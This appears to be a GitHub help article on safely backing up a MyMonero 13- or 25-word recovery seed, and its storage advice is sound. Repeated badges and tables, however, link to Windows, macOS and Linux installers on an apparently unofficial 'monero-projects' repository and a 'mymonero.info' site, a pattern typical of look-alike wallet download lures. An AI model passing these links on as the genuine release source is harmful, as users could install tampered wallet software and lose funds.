<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">Back Up Your MyMonero Seed Safely</h1>
<p align="center">Keep recovery words private, legible, and available when you need them.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
Write your MyMonero recovery seed in a private, durable offline backup and store it where you control access. Never email it, upload it, or give it to anyone; nobody legitimate asks for your seed.


The MyMonero.info site covers this in its [MyMonero seeds and keys guide](https://mymonero.info/seeds-and-keys). Before installing anything, use the [MyMonero download page](https://mymonero.info/github/monero-projects), and read [MyMonero safety facts](https://mymonero.info/is-mymonero-safe) if anything feels off.

## You'll see this if
- You are creating a backup before moving devices or restoring a wallet.
- You found a seed note but do not know how to store it safely.
- You want a second copy in case the first is damaged or lost.
- You are unsure whether your phrase has 13 or 25 words.
- Someone asks you to “verify” a seed by entering it online.

## Why it happens
A seed is recovery information that can provide access to a wallet. It must be both available to you and kept away from other people. A backup that is lost, unreadable, or incomplete may not help when a device is unavailable. A backup stored in email, cloud notes, screenshots, or a shared file may be exposed to accounts and devices beyond your control.

MyMonero has two seed formats: a 13-word MyMonero-specific legacy seed or a 25-word standard Monero seed. The words and their order matter. A password for an app and private view or spend keys are separate credentials; label them distinctly if you keep records. The final desktop release is v1.3.3, and the old app still opens wallets and sends XMR but is no longer maintained, with no new features or security updates. Hosted servers and web wallet login stopped. Refer to [seed formats](./mymonero-seed-13-vs-25-words.md), [finding your seed](./find-mymonero-seed.md), and [the release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

---

## Fix
1. **Find the correct phrase.** Use your own wallet records to identify the recovery seed. Count the words privately: MyMonero phrases may be 13 words (legacy, MyMonero-specific) or 25 words (standard Monero). Do not assume that an app password or private key is the seed.
2. **Write it down accurately.** Copy every word in its original sequence, preserving spelling and order. Use a medium that remains legible over time. Work in private, without cameras, screen-sharing, or other people able to observe. Avoid speaking the phrase aloud in public.
3. **Check the copy privately.** Compare your new record with the source, word by word, without sending it to a checker or another person. Confirm the count and sequence. If a word is unclear, do not guess; consult your own source records and preserve the original.
4. **Add a non-secret label.** Identify which wallet the backup belongs to and whether it is the 13-word MyMonero-specific legacy format or the 25-word standard Monero format. Do not put the words on an exposed outer label. Keep this contextual note separate from the phrase if that better protects privacy.
5. **Choose secure storage.** Store the written backup in a private place with protection against unauthorized access and ordinary damage. Consider material and location appropriate to your circumstances. A second physical copy in a separate secure location can reduce the risk of a single accident, but each copy must remain private and controlled.
6. **Avoid digital exposure.** Do not photograph the phrase, paste it into a note app, email it, or upload it to cloud storage. Do not enter it into a website that claims to check whether it is valid. Nobody legitimate asks for your seed.
7. **Plan recovery context.** Keep any useful non-secret details, such as the wallet identity or a known restore height, separately and securely. Restore height is the block height where scanning begins; earlier is safer when uncertain but slower. Read [restore height explained](./mymonero-restore-height-explained.md) before a future restore.
8. **Review access periodically.** Make sure you can still find the backup and that it remains legible, without leaving it exposed while checking. Update the storage plan if your circumstances change. Do not destroy the only copy until you have confirmed another complete backup exists.

> [!TIP]
> A label such as “MyMonero legacy, 13 words” or “standard Monero, 25 words” can prevent format confusion without revealing any recovery words.

> [!WARNING]
> Never share the seed with a person, support channel, website, or wallet “verification” service. A seed backup should remain under your control.

## If that did not work
If you cannot find the seed, search your own private records and the places you intentionally stored backups. The old desktop app may still open wallets, but it is no longer maintained. Do not assume the app password will recreate a seed. MyMonero’s hosted servers and web wallet login stopped, and password reset or seed extraction methods are not confirmed here. Avoid anyone who promises recovery in exchange for remote access or wallet credentials.

If a backup is incomplete or has an unreadable word, preserve it and look for another copy. Offline recovery of a missing word is not confirmed here. Do not submit partial words to a website or stranger. See [what to do about a lost seed word](./mymonero-lost-seed-word.md) and seed not accepted for cautious next steps.

If you are preparing a migration, do not confuse restoring with sweeping. Restore uses recovery information to open a wallet; sweeping sends all funds to a new wallet. Understand the action and verify the recipient before proceeding. The available options are continuing with MyMonero desktop or restoring in Cake Wallet. Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. See the migration checklist.

## Prevention
Create the backup before a device is lost or replaced. Verify that the phrase is complete, readable, and associated with the intended wallet while you are in a private setting. Keep the backup away from everyday browsing and social accounts. A secure offline record is more useful than an exposed digital copy, but storage must also be resilient to damage and loss.

Tell any person who may help with household arrangements that they should never request or photograph the phrase. Keep recovery information separate from device passwords, and avoid writing all credentials together in an unprotected location. Check software downloads using SHA-256, never by providing a seed. Learn how to verify the desktop release and how to identify your seed.

## FAQ
<details><summary>Should I keep my seed in a cloud note?</summary>

Avoid uploading it to cloud notes, email, or shared files. Use a private offline backup under your control.

</details>

<details><summary>How do I know which format I have?</summary>

MyMonero uses a 13-word legacy MyMonero-specific seed or a 25-word standard Monero seed. Count privately.

</details>

<details><summary>Can support check whether my backup is correct?</summary>

Do not share it. Compare your copy privately with your own records; nobody legitimate asks for your seed.

</details>

<details><summary>Should I make more than one copy?</summary>

A secure second copy can help protect against a single loss, provided each copy remains private and under your control.

</details>

---

## Download MyMonero

- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [Find Your MyMonero Seed](./find-mymonero-seed.md) | Locate the recovery phrase you saved when setting up your wallet. |
| [MyMonero Seed: 13 vs 25 Words](./mymonero-seed-13-vs-25-words.md) | Understand which recovery phrase format you have before restoring. |
| [MyMonero Seed Not Accepted](./mymonero-seed-not-accepted.md) | Check the format and your own backup without exposing recovery words. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
